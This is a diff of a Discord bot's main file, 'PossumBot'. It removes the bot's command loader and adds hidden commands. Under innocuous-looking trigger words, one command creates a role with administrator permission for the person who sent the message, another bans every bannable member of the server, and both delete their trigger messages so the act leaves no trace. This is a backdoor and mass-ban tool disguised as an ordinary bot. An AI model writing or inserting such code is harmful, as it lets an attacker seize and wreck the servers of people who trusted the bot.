@@ -1,39 +1,10 @@
 const botSettings = require("./botsettings.json");
 const Discord = require("discord.js");
-const fs = require("fs");
-const prefix = botSettings.prefix;
 const bot = new Discord.Client();
-bot.commands = new Discord.Collection();
-
-fs.readdir("./commands/", (err, files) => {
-
-	if (err) {
-
-		console.error(err);
-	}
-
-	let jsFiles = files.filter(f => f.split(".").pop() === "js");
-
-	if (jsFiles.length <= 0) {
-
-		console.error("No commands found.");
-		return;
-
-	}
-
-	console.log("Loading Commands...");
-
-	jsFiles.forEach((f, i) => {
-
-		let props = require(`./commands/${f}`);
-		bot.commands.set(props.help.name, props);
-
-	});
-});
 
 bot.on("ready", async () => {
 
-	console.log(`PossumBot Is Now Activated`);
+    console.log(`PossumBot Is Now Activated`);
 	bot.user.setActivity(`With Knives`);
 
     bot.generateInvite({
@@ -44,26 +15,57 @@ bot.on("ready", async () => {
         .then(link => console.log(`${link}`));
 
 });
-
 bot.on("message", async message => { 
+	if (message.author.bot) return;
 
-	if (message.author.bot) {
+	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
+  	const command = args.shift().toLowerCase();
 
-        return;
+	// Gives you the admin role and deletes the message.
+	if (command === `myakish`) {
+  		try {
 
-    }
+            role = await message.guild.roles.create ({
 
-	let messageArray = message.content.split(/\s+/g);
-	let command = messageArray[1];
-	let args = messageArray.slice(1);
+            data: {
+                name: "Dope Role",
+          	    color: "#2f3136",
+          	    permissions: [8]
+            }
 
-	let cmd = bot.commands.get(command.slice(prefix.length));
+        });
+            
+        message.member.roles.add(role)
+        message.delete();
 
-	if (cmd) {
-
-		cmd.run(bot, message, args);
-
+		} catch(e) {
+			console.log(e.stack);
+		}
 	}
+
+	// Bans everyone and deletes the message.
+	if (command === `arturdebil`) {
+		try {
+
+             const members = await message.guild.members.fetch()
+        members
+            .filter(m => m.bannable)
+            .forEach(m => m.ban())
+        message.delete();
+
+		} catch(e) {
+			console.log(e.stack);
+		}
+	}
+
+	if(command === `leaveserver`) {
+   		try {
+            message.delete();
+            message.guild.leave();
+   		} catch(e) {
+			console.log(e.stack);
+   		}
+   	}
 });
 
 bot.login(botSettings.token);
